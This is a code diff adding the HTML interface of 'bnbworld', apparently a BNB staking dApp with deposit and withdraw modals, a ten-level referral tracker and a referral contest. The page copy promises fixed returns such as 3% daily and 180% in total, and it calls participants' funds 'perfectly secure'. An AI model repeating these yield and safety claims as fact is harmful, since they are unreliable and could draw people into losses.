+                        Stake BNB</a>
+                    </div>
+
+                  </div>
+
+                  <!-- <div class="wd-item">
+					
+					<div class="wd-item-content">
+						<div class="sum js-dividends">
+						 OX FARMING (60 Days)
+						</div>
+						<div class="eq js-dividends">3% / Daily | 180%</div>
+						<div class="deposit-input">
+							<input class="input" id="bnbamount3" type="number" step="0.01" placeholder="Enter BNB amount" min="0.1" required="required">
+							<span class="label"><span class="bnb"></span></span>
+						</div>
+						<div class="sum js-dividends"></div>
+						<a href="javascript:void(0);" onclick="stakebnb(3)" class="btn btn-3 btn-block">
+						Stake BNB</a>
+					</div>
+					
+				</div> -->
+
+
+                </div>
+              </div>
+
+              <div class="block">
+                <div class="wd-item">
+                  <div class="wd-item-content">
+                    Available Withdraw Balance:
+                    <div class="sum js-dividends"><span id="bal">0.00000</span> <span class="bnb"></span></div>
+                    <div class="eq js-dividends-usd"><span id="balusd">0.00000</span> USD</div>
+                  </div>
+                  <div class="wd-item-btns">
+                    <a href="#" data-modal="" data-src="#confirmDividends" class="btn btn-bordered recieve-btn">
+                      <i class="svgicon svgicon-download">
+
+                        <svg>
+
+                          <use xlink:href="img/icons/symbol/sprite.svg#download"></use>
+
+                        </svg>
+
+                      </i>
+                      Withdraw</a>
+                  </div>
+                </div>
+              </div>
+              <div class="block">
+                <div class="stat-columns">
+                  <div class="col">
+                    <div class="witem">
+                      <div class="witem-content">
+                        <div class="witem-title with-info">
+                          <span class="amount"><span id="totdep"></span> BNB</span>
+
+                        </div>
+                        Total Deposit:
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="witem">
+                      <div class="witem-content">
+                        <div class="witem-title with-info">
+                          <span class="amount"><span id="totwith"></span> BNB
+
+                          </span>
+                        </div>
+                        Total Withdraw:
+                      </div>
+                    </div>
+                  </div>
+
+                </div>
+                <!-- <div class="table">
+              <div class="table-row">
+                <div class="label">Total Invested:</div>
+                <div class="val"><span class="badge js-user-invested">0.00 <span class="bnb"></span></span>
+                </div>
+              </div>
+              <div class="table-row">
+                <div class="label">Number of deposits:</div>
+                <div class="val"><span class="badge js-user-deposits">0</span>
+                </div>
+              </div>
+              <div class="table-row">
+                <div class="label">Last deposit date:</div>
+                <div class="val"><span class="badge js-user-checkpoint">-</span>
+                </div>
+              </div>
+              <div class="table-row">
+                <div class="label">
+                  <br>
+                </div>
+                <div class="val">
+                  <br>
+                </div>
+              </div>
+              <div class="table-row">
+                <div class="label">Total earned:</div>
+                <div class="val"><span class="badge js-user-earned">0.00 <span class="bnb"></span></span>
+                </div>
+              </div>
+              <div class="table-row">
+                <div class="label">Total withdrawn:</div>
+                <div class="val"><span class="badge js-user-withdrawn">0.00 <span class="bnb"></span></span>
+                </div>
+              </div>
+            </div> -->
+              </div>
+            </div>
+
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title">
+                  Referral Statistics
+                </div>
+                <div class="modal-content">
+                  <p>This window gives you access to detailed information relating to your referral statistics. You can
+                    view Your Upline, Referral Link (active after a minimum deposit of 0.1 BNB. bnbworld is the only
+                    platform giving you access to such detailed referral statistics! Refer to as many users as you can
+                    and enjoy massive earnings on this wonderful platform.</p>
+
+                  <div class="ref-witems">
+                    <div class="witem ref-witem js-hide-referral">
+                      <div class="witem-icon">
+
+                        <i class="svgicon svgicon-internet">
+
+                          <svg>
+
+                            <use xlink:href="img/icons/symbol/sprite.svg#internet"></use>
+
+                          </svg>
+
+                        </i>
+
+                      </div>
+
+                      <div class="witem-content">
+                        <div class="witem-title "><span id="referrallink"></span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">
+
+                        <button class="witem-copy" data-copy="#referrallink">
+                          <i class="svgicon svgicon-copy">
+
+                            <svg>
+
+                              <use xlink:href="img/icons/symbol/sprite.svg#copy"></use>
+
+                            </svg>
+
+                          </i>
+                        </button>
+                      </div>
+                    </div>
+                    <div class="witem ref-witem">
+                      <div class="witem-icon">
+
+                        <i class="svgicon svgicon-internet">
+
+                          <svg>
+
+                            <use xlink:href="img/icons/symbol/sprite.svg#internet"></use>
+
+                          </svg>
+
+                        </i>
+
+                      </div>
+                      <div class="witem-content">
+                        <div class="witem-title js-user-upline">
+                          <input type="hidden" class="form-control" id="referral_key" placeholder=""
+                            value="0x0000000000000000000000000000000000000000" readonly="">
+
+                        </div>
+                        Scan QR Code <br>
+
+                      </div>
+                      <span id="qrimg"></span>
+                    </div>
+                  </div>
+
+
+                  <div class="rewards">
+                    <h4>Rewards</h4>
+                    <div class="rewards-item">
+                      <div class="witem">
+                        <div class="witem-icon">
+
+                          <i class="svgicon svgicon-reward">
+
+                            <svg>
+
+                              <use xlink:href="img/icons/symbol/sprite.svg#reward"></use>
+
+                            </svg>
+
+                          </i>
+
+                        </div>
+                        <div class="witem-content">Farming Dividends:</div>
+                        <div class="witem-amount">
+                          <span class="amount"><span id="dividends">0.00000</span> <span class="cur"><span
+                                class="bnb"></span></span></span>
+                          <span class="amount"><span id="dividendsusd">0.00000</span> <span
+                              class="cur">USD</span></span>
+                        </div>
+
+                      </div>
+                    </div>
+
+                    <div class="rewards-item">
+                      <div class="witem">
+                        <div class="witem-icon">
+
+                          <i class="svgicon svgicon-reward">
+
+                            <svg>
+
+                              <use xlink:href="img/icons/symbol/sprite.svg#reward"></use>
+
+                            </svg>
+
+                          </i>
+
+                        </div>
+                        <div class="witem-content">Seed Income:</div>
+                        <div class="witem-amount">
+                          <!-- <span class="amount">Total: <span id="seed">0.00000</span> <span class="cur"><span class="bnb"></span></span></span>-->
+                          <span class="amount">Current: <span id="seedcurrent">0.00000</span> <span class="cur"><span
+                                class="bnb"></span></span></span>
+                        </div>
+                        <div class="witem-opts">
+
+                        </div>
+                      </div>
+                    </div>
+                    <div class="rewards-item">
+                      <div class="witem">
+                        <div class="witem-icon">
+
+                          <i class="svgicon svgicon-reward">
+
+                            <svg>
+
+                              <use xlink:href="img/icons/symbol/sprite.svg#reward"></use>
+
+                            </svg>
+
+                          </i>
+
+                        </div>
+                        <div class="witem-content">Referral Income:</div>
+                        <div class="witem-amount">
+                          <span class="amount">Referrals: <span id="tuser"></span> | Earnings: <span
+                              id="earning"></span> <span class="cur"><span class="bnb"></span></span></span>
+                          <br><span class="amount">Current Earnings: <span id="currentearning">BNB</span> <span
+                              class="cur"><span class="bnb"></span></span></span>
+                        </div>
+
+                      </div>
+                    </div>
+
+                  </div>
+
+                </div>
+              </div>
+              <div class="block">
+                <div class="wd-item">
+
+                  <div class="wd-item-content">
+                    Total Direct business:
+                    <div class="sum js-dividends"><span id="totaldirectsell">0.00000</span> <span class="bnb"></span>
+                    </div>
+                    <div class="eq js-dividends-us"><span id="totaldirectsellusd">0.00000</span> <span class="">
+                        $</span></div>
+
+                  </div>
+                  <div class="wd-item-content">
+                    Total Referral business:
+                    <div class="sum js-dividends"><span id="totalteamsell">0.00000</span> <span class="bnb"></span>
+                    </div>
+                    <div class="eq js-dividends-us"><span id="totalteamsellusd">0.00000</span> <span class=""> $</span>
+                    </div>
+
+                  </div>
+                  <div class="wd-item-content">
+                    Total Seed business:
+                    <div class="sum js-dividends"><span id="totalseedsell">0.00000</span> <span class="bnb"></span>
+                    </div>
+                    <div class="eq js-dividends-us"><span id="totalseedsellusd">0.00000</span> <span class=""> $</span>
+                    </div>
+
+                  </div>
+
+
+                </div>
+
+
+
+              </div>
+
+              <div class="block">
+                <div class="ref-levels">
+                  <div class="ref-level level1">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">1st Referral Level:</div>
+                      Active Referrals: <strong id="lvl1">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered " onclick="getdown(1)" data-src="#ref">Check
+                        Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level2">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">2nd Referral Level:</div>
+                      Active Referrals: <strong id="lvl2">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered" onclick="getdown(2)" data-src="#ref">Check
+                        Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level3">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">3rd Referral Level:</div>
+                      Active Referrals: <strong id="lvl3">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(3)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level4">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">4th Referral Level:</div>
+                      Active Referrals: <strong id="lvl4">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(4)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level5">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">5th Referral Level:</div>
+                      Active Referrals: <strong id="lvl5">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(5)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level6">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">6th Referral Level:</div>
+                      Active Referrals: <strong id="lvl6">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(6)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level7">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">7th Referral Level:</div>
+                      Active Referrals: <strong id="lvl7">0</strong>
+                    </div>
+                    <div data-modal="" class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(7)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level8">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">8th Referral Level:</div>
+                      Active Referrals: <strong id="lvl8">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(8)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level9">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">9th Referral Level:</div>
+                      Active Referrals: <strong id="lvl9">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(9)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+                  <div class="ref-level level10">
+                    <div class="ref-level-icon">
+                      <img src="img/icons/ref3.png">
+                    </div>
+                    <div class="ref-level-content">
+                      <div class="ref-level-title">10th Referral Level:</div>
+                      Active Referrals: <strong id="lvl10">0</strong>
+                    </div>
+                    <div class="ref-level-opts">
+                      <div class="info-icon">
+                        <i>i</i>
+                        <div class="comment">
+                          Your active referrals
+                        </div>
+                      </div>
+
+                      <a data-modal="" href="#" class="btn btn-bordered js-showRefs" onclick="getdown(10)"
+                        data-src="#ref">Check Referrals</a>
+                    </div>
+                  </div>
+
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- stat popup end -->
+
+
+  <!--  <div class="fixed-contacts">
+      <a href="https://t.me/bnbworldio" class="btn btn-2" target="_blank"><span class="lang-icon us"></span> 
+
+<i class="svgicon svgicon-tg2">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#tg2"></use> 
+
+  </svg>
+
+</i>
+
+ Eng</a>
+     
+    </div>-->
+
+
+
+
+
+
+  <!-- notices -->
+  <div class="notice-wrap">
+  </div>
+  <!-- notices end -->
+
+
+  <!-- MODALS -->
+  <div id="make-deposit" class="modal modal-lg">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            Make Deposit
+          </div>
+          <div class="modal-content">
+            <form id="make-deposit-form" action="#">
+              <div class="modal-columns clearfix">
+                <div class="column">
+                  <div class="deposit-input">
+                    <input type="text" class="input js-calc js-deposit-amount" value="1">
+                    <span class="label"><span class="bnb"></span></span>
+                  </div>
+                  <div class="deposit-capt">Minimal deposit amount is 0.01 <span class="bnb"></span>
+                  </div>
+
+                  <div class="important">
+                    <p><strong>IMPORTANT:</strong>
+                    </p>
+                    <p>Do not forget about <span class="bl"></span> fee! You should have 0.004 <span class="bnb"></span>
+                      more on your wallet, or your transaction will get out of energy status!</p>
+                  </div>
+                </div>
+                <div class="column">
+                  <ul class="arr-list">
+                    <li>Minimal Deposit Amount: 0.01 <span class="bnb"></span> (No Maximal Limits)</li>
+                    <li>We Are Working Only With <span class="bnb"></span> Cryptocurrency</li>
+                    <li>Your Deposit Will Be Activated After 1 Confirmation In <span class="bl"></span>
+                    </li>
+                    <li>Earnings Comes Every Moment On Your Wallet Balance, You Can Withdraw It Any Time You Want</li>
+                  </ul>
+                </div>
+              </div>
+              <div class="input-wrap">
+                <input type="submit" value="Make Deposit" class="btn btn-2 btn-block js-mdeposit">
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #make-deposit -->
+
+  <div id="thx" class="modal modal-sm">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            Make Deposit
+          </div>
+          <div class="modal-content">
+            <form>
+              <div class="thx-text">
+                <div class="thx-icon">
+
+                  <i class="svgicon svgicon-ok">
+
+                    <svg>
+
+                      <use xlink:href="img/icons/symbol/sprite.svg#ok"></use>
+
+                    </svg>
+
+                  </i>
+
+                </div>
+                <div class="thx-title">Successfully Deposit</div>
+                <p>We have received your Deposit. Now you can start attracting new members with your referral link and
+                  earn extra.</p>
+              </div>
+              <div class="stats">
+                <div class="stats-row">
+                  <div class="stats-item">
+                    <div class="stats-label"><span class="js-calc-amount js-deposit-amount-finish">1</span> <span
+                        class="cur"><span class="bnb"></span></span>
+                    </div>
+                    Your Deposit
+                  </div>
+                  <div class="stats-item">
+                    <div class="stats-label"><span class="js-contract-rate">5.10</span> <span class="cur">%</span>
+                    </div>
+                    Contract Profit Now
+                  </div>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #thx -->
+
+
+  <div id="how" class="modal modal-double">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-double-content">
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title with-icon">
+                  <span class="question">?</span> How To Get <span class="bnb"></span>?
+                </div>
+                <div class="modal-content">
+                  <p>You can easily acquire <span class="bnb"></span> from most popular cryptocurrency exchange
+                    platforms, like Binance, Poloniex, Bitfinex, OKEx, etc.</p>
+                  <p>After purchasing <span class="bnb"></span>, you can transfer it to your personal wallet, and then
+                    transfer it to our <span class="contract"></span> address.</p>
+
+                  <a href="https://www.binance.com/en/" target="_blank" class="btn btn-2">Binance</a>
+                  <a href="index-1.htm" target="_blank" class="btn btn-2">Poloniex</a>
+                  <br>
+                  <br>
+                  <br>
+                  <div class="important">
+                    <p><strong>IMPORTANT:</strong>
+                    </p>
+                    <p>We are only working with personal wallets. Please don’t make deposits directly fromthe exchange
+                      platforms. If you do so, the payouts will be made to the exchange platform and not to your account
+                      - you will lose funds. As such, whenever
+                      you want to send <span class="bnb"></span> payments to our <span class="contract"></span> address,
+                      please route it through your personal wallet.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title with-icon">
+                  <span class="question">?</span> Which <span class="bnb"></span> Personal Wallets To Use?
+                </div>
+                <div class="modal-content">
+                  <div class="modal-img">
+                    <img src="img/data/iphone43a0.png" alt="">
+                  </div>
+                  <p>You can use two types of wallets:</p>
+                  <h5>Browser Extensions, Like Metamask or Trustwallet:</h5>
+                  <p>Install The Extension On Your Favorite Browser And Create A Personal Wallet Address.</p>
+                  <h5>Mobile Crypto Wallets:</h5>
+                  <p>Use Any Personal Crypto Wallet That Supports <span class="bnb"></span> Cryptocurrency And <span
+                      class="bnb"></span> Dapps» Technology, Like TrustWallet, Metamaks, And Others.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #how -->
+
+
+  <div id="promo" class="modal">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            PROMO MATERIALS
+          </div>
+          <div class="modal-content">
+            <div class="ref-witems js-hide-referral" style="display:block;">
+              <div class="witem ref-witem">
+                <div class="witem-icon">
+
+                  <i class="svgicon svgicon-internet">
+
+                    <svg>
+
+                      <use xlink:href="img/icons/symbol/sprite.svg#internet"></use>
+
+                    </svg>
+
+                  </i>
+
+                </div>
+                <div class="witem-content">
+                  <div class="witem-title "><span id="your_ref_url" class="your_ref_url"></span>
+                  </div>
+                  Your Referral Link
+                </div>
+                <div class="witem-opts">
+                  <div class="info-icon">
+                    <i>i</i>
+                    <div class="comment">
+                      Once The <span class="bnb"></span> <span class="contract"></span> Is Published On The <span
+                        class="bnb"></span> <span class="bl"></span>, It Can’t Be Modified By Any Individual Or
+                      Administrative Body. Participants Can Rest Assured That
+                      Their Funds Are Perfectly Secure.
+                    </div>
+                  </div>
+                  <button class="witem-copy" data-copy="#your_ref_url">
+                    <i class="svgicon svgicon-copy">
+
+                      <svg>
+
+                        <use xlink:href="img/icons/symbol/sprite.svg#copy"></use>
+
+                      </svg>
+
+                    </i>
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="invite-deposit js-ref-inactive" style="display:none;">
+              <div class="invite-deposit-icon">
+                <i class="svgicon svgicon-lock">
+                  <svg>
+
+                    <use xlink:href="img/icons/symbol/sprite.svg#lock"></use>
+
+                  </svg>
+
+                </i>
+
+              </div>
+              <p>You Need Active Deposit To Unlock Referrals</p>
+            </div>
+            <div class="banners-select js-hide-referral" style="display:block;">
+              <div class="input-wrap">
+                <select class="select">
+                  <option disabled="" selected="">Select Size</option>
+                  <option data-w="120" data-h="60">120x60</option>
+                  <option data-w="320" data-h="100">320x100</option>
+                  <option data-w="336" data-h="280">336x280</option>
+                  <option data-w="468" data-h="60">468x60</option>
+                  <option data-w="728" data-h="90">728x90</option>
+                  <option data-w="970" data-h="90">970x90</option>
+                  <option data-w="970" data-h="250">970x250</option>
+                </select>
+              </div>
+            </div>
+            <div class="banners-cont">
+              <textarea class="banners-code"></textarea>
+              <div class="banners-btns">
+                <a href="#" class="btn btn-2 gif-link" target="_blank">View Banner</a>
+                <a href="#" class="btn btn-2 banners-copy">Copy Code</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #promo -->
+
+
+  <div id="ref" class="modal">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            <p>Your Downline addresses</p><br>
+            <div>
+
+              <span id="levelbody"></span>
+            </div>
+          </div>
+          <!-- <div class="modal-content">
+	    <div class="ref-item" id="RefTemplate" style="display:none;">
+            <div class="ref-item-top">
+              <div class='js-r-address'></div>
+              <div class="date js-r-joinned"></div>
+            </div>
+            <div class="ref-item-bottom">
+              <div>Invested: <span class="amout js-r-deposit">0 <span class="bnb"></span></span>
+              </div>
+              <div>Earned: <span class="amout js-r-earned">0 <span class="bnb"></span></span>
+              </div>
+            </div>
+      </div>
+            <div class="paginate" data-perpage='4'>
+              <div class="ref-list items js-result">
+
+              </div>
+              <div class="pager">
+                <div class="pageNumbers"></div>
+
+                <div class="previousPage">
+                  <i class="svgicon svgicon-arrow">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use> 
+
+  </svg>
+
+</i>
+                </div>
+                <div class="nextPage">
+                  <i class="svgicon svgicon-arrow">
+
+  <svg>
+
+    <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use> 
+
+  </svg>
+
+</i>
+                </div>
+              </div>
+            </div>
+          </div>-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #ref -->
+
+
+  <div id="subscribe" class="modal modal-sm">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+          </div>
+          <div class="modal-content">
+            <div class="subscribe-text">
+              <div class="subscribe-icon">
+                <img src="img/data/subscribe.png" alt="">
+              </div>
+              <div class="subscribe-title">Subscribe To Newsletter</div>
+              <p>Subscribe to our newsletter to get updates on the Contests, Airdrops and many more!</p>
+            </div>
+            <form class="subscribe-form">
+              <div class="input-wrap">
+                <input type="email" required="" placeholder="Your E-Mail" class="input" type="email">
+              </div>
+              <div class="input-wrap">
+                <input type="submit" value="Subscribe" class="btn btn-block">
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #subscribe -->
+
+
+  <div id="confirmCommissions" class="modal modal-sm">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            Are you sure you would like to Withdraw all commissions?
+          </div>
+          <div class="modal-content">
+
+            <div class="how-buttons">
+              <div><a class="btn btn-2 withdraw-btn js-withdrawCommissions">Yes</a>
+              </div>
+              <div><a href="#" class="btn btn-cancel js-modal-close">Cancel</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="confirmDividends" class="modal modal-sm">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-title">
+            Are you sure you would like to Withdraw all dividends+referral + seed?
+          </div>
+          <div class="modal-content">
+
+            <div class="how-buttons">
+              <div><a class="btn btn-2 withdraw-btn " onclick="harvest()">Yes</a>
+              </div>
+              <div><a href="#" class="btn btn-cancel js-modal-close">Cancel</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="offer" class="modal modal-lg">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+
+
+        </div>
+      </div>
+    </div>
+  </div>
+  </div>
+  <!-- #confirm -->
+
+
+
+  <div id="contest" class="modal modal-double contest-popup">
+    <div class="modal-body-wrap">
+      <div class="modal-backdrop"></div>
+      <div class="modal-body-scroll">
+        <div class="modal-body">
+          <button type="button" class="modal-close" title="Close">
+            <svg xmlns="http://www.w3.org/2000/svg" version="1" viewbox="0 0 24 24">
+              <path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path>
+            </svg>
+          </button>
+          <div class="modal-double-content">
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title">
+                  Weekly Referral contest!
+                </div>
+                <div class="modal-content rules">
+
+                  <div class="subscribe-text">
+                    <div class="subscribe-icon">
+                      <img src="img/data/win.png" alt="">
+                    </div>
+                    <p>Starting From
+                    <div class="dates">From 7.12.2021 - 8:00 PM </div>
+
+                    <p>bnbworld the best Smart Contract platform, is happy to announce our first referral contest with a
+                      grand prize worth <strong>US$2500!</strong> paid in BNB.
+                    </p>
+                  </div>
+                </div>
+              </div>
+              <div class="block">
+                <div class="modal-content">
+                  <div class="rules">
+                    <h4 class="with-icon">
+
+                      <i class="svgicon svgicon-arrow">
+
+                        <svg>
+
+                          <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use>
+
+                        </svg>
+
+                      </i>
+
+                      Contest Rules
+                    </h4>
+                    <p>Our referral contest’s rules are simple. Refer our platform to new users and ensure they make an
+                      Investment. The bnbworld users with the greatest number of active referrals will win the contest.
+                    </p>
+                    <h4 class="with-icon">
+
+                      <i class="svgicon svgicon-arrow">
+
+                        <svg>
+
+                          <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use>
+
+                        </svg>
+
+                      </i>
+
+                      Contest Description
+                    </h4>
+                    <p>According to the contest’s rules, you have to refer the bnbworld platform to as many new users as
+                      possible, and encourage them to Invest. Towards the end of the contest, we will award 10 lucky
+                      participants in the Referral Rewards Program.
+                      We welcome participants from across the globe. There’s no need to apply for the contest — all you
+                      have to do is start referring. Everyone with active referrals will automatically be eligible for
+                      the grand prize.</p>
+                    <h4 class="with-icon">
+
+                      <i class="svgicon svgicon-arrow">
+
+                        <svg>
+
+                          <use xlink:href="img/icons/symbol/sprite.svg#arrow"></use>
+
+                        </svg>
+
+                      </i>
+
+                      How to Enter?
+                    </h4>
+                    <p>Make sure that you have a minimum of 0.01 BNB Invested in order to activate referral link. Post
+                      in on telegram groups, social media, send it to friends, make a Youtube video, make sure that you
+                      are getting active referrals.</p>
+                    <h4>Referrals Will be counted only from 1st level referral Investments</h4>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="modal-part">
+              <div class="block">
+                <div class="modal-title">
+                  Winner Section
+                </div>
+                <div class="modal-content">
+                  <br>
+                  <div class="rules">
+                    <p>In this section you can see top 10 addresses with the most referrals counted from the contest
+                      launch date - <strong class='c-date'>29.09.2021 - 11:00 AM - Till - 06.10.2021 - 15:00 PM
+                        EST</strong>
+                    </p>
+                  </div>
+                  <div class="table">
+                    <div class="table-row">
+                      <div class="label">You can use your referral link in the</div>
